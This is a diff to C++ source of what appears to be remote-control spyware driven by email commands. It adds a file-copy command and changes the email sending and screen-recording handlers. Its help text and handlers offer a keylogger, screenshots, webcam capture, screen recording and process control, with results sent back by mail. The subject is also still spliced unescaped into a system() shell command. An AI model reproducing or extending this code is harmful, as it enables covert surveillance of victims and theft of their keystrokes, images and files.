@@ -73,18 +73,22 @@ std::string readLastEmailCommand()
 
 bool sendEmail(const std::string& subject, const std::string& body)
 {
-    std::string command = "python \"" + script_dir + "send_mail.py\" \"" + subject + "\" \"" + body + "\"";
-    int result = system(command.c_str());
-
-    if (result != 0)
+    std::string tempFile = script_dir + "email_body.txt";
+    std::ofstream out(tempFile);
+    if (!out.is_open()) 
     {
-        std::cerr << "Failed to send email." << std::endl;
+        std::cerr << "Failed to write email body to file." << std::endl;
         return false;
     }
+    out << body;
+    out.close();
 
-    std::cout << "Email sent successfully: " << subject << std::endl;
-    return true;
+    std::string command = "python \"" + script_dir + "send_mail.py\" \"" + subject + "\" \"" + tempFile + "\"";
+    int result = system(command.c_str());
+
+    return result == 0;
 }
+
 
 bool sendEmailWithAttachment(const std::string& subject, const std::string& body, const std::string& filepath)
 {
@@ -123,20 +127,23 @@ std::string executeCommand(const std::string& cmd)
 {
     if (cmd == "help")
     {
-        return "Available commands:\n"
-               "  help                    - Show this help message\n"
-               "  list_services           - List all running services\n"
-               "  start <path>            - Start a process from given path\n"
-               "  stop <process_name>     - Stop a process by name\n"
-               "  list_apps               - List all visible applications\n"
-               "  start_keylogger         - Start keylogger\n"
-               "  stop_keylogger          - Stop keylogger\n"
-               "  screenshot              - Capture screen and save as PNG\n"
-               "  webcam_photo            - Capture single webcam photo\n"
-               "  restart                 - Restart the system\n"
-               "  shutdown                - Shutdown the system\n"
-               "  start_record            - Start screen recording\n"
-               "  stop_record             - Stop screen recording\n";
+        std::string helpMsg = 
+            "Available commands:\n"
+            "  help                    - Show this help message\n"
+            "  list_services           - List all running services\n"
+            "  start <path>            - Start a process from given path\n"
+            "  stop <process_name>     - Stop a process by name\n"
+            "  list_apps               - List all visible applications\n"
+            "  copyfile <source>       - Copy file from source to current directory\n"
+            "  start_keylogger         - Start keylogger\n"
+            "  stop_keylogger          - Stop keylogger\n"
+            "  screenshot              - Capture screen and save as PNG\n"
+            "  webcam_photo            - Capture single webcam photo\n"
+            "  restart                 - Restart the system\n"
+            "  shutdown                - Shutdown the system\n"
+            "  start_record            - Start screen recording\n"
+            "  stop_record             - Stop screen recording\n";
+        return helpMsg;
     }
     else if (cmd == "list_services")
     {
@@ -163,6 +170,19 @@ std::string executeCommand(const std::string& cmd)
         out << listUserApps();
         out.close();
         return filename;
+    }
+    else if (cmd.rfind("copyfile ", 0) == 0)
+    {
+        std::string sourcePath = cmd.substr(9);
+        std::string destPath = fs::current_path().string() + "\\" + fs::path(sourcePath).filename().string();
+        if (fs::copy_file(sourcePath, destPath, fs::copy_options::overwrite_existing))
+        {
+            return "File copied successfully to: " + destPath;
+        }
+        else
+        {
+            return "Failed to copy file from: " + sourcePath;
+        }
     }
     else if (cmd == "start_keylogger")
     {
@@ -201,7 +221,7 @@ std::string executeCommand(const std::string& cmd)
         {
             std::string filename = fs::current_path().string() + "\\screen_recording.avi";
             startScreenRecording(filename);
-            return filename;
+            return "Screen recording started.";
         }
         else return "Already recording.";
     }
@@ -210,10 +230,12 @@ std::string executeCommand(const std::string& cmd)
         if (isRecording())
         {
             stopScreenRecording();
-            return "Recording stopped.";
+            std::string filename = fs::current_path().string() + "\\screen_recording.avi";
+            return filename;
         }
         else return "No recording in progress.";
     }
+
 
     return "Unknown command: " + cmd;
 }
